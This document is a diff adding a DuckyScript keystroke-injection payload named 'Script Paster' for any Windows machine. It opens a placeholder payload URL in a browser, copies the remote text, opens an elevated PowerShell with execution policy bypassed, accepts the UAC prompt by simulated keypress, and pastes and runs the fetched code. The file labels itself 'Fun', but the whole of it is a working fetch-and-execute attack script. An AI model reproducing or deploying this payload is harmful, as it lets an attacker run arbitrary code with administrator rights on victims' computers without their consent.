@@ -1,0 +1,36 @@
+REM Title:       Script Paster
+REM Author:	 MrProxy
+REM Description: Run payload from link
+REM Target:	 Any Windows
+REM Version:	 1.0
+REM Category:	 Fun
+REM
+GUI m
+DELAY 2000
+GUI r
+DELAY 1000
+STRING https://your.payloadlink.example/payload.txt
+DELAY 50
+ENTER
+DELAY 3500
+CTRL A
+DELAY 500
+CTRL C
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell -NoP -NonI -Exec Bypass
+DELAY 100
+CTRL-SHIFT ENTER
+DELAY 750
+LEFTARROW
+DELAY 100
+ENTER
+DELAY 3500
+CTRL V
+DELAY 2000
+ENTER
+DELAY 5000
+STRING exit
+DELAY 50
+ENTER
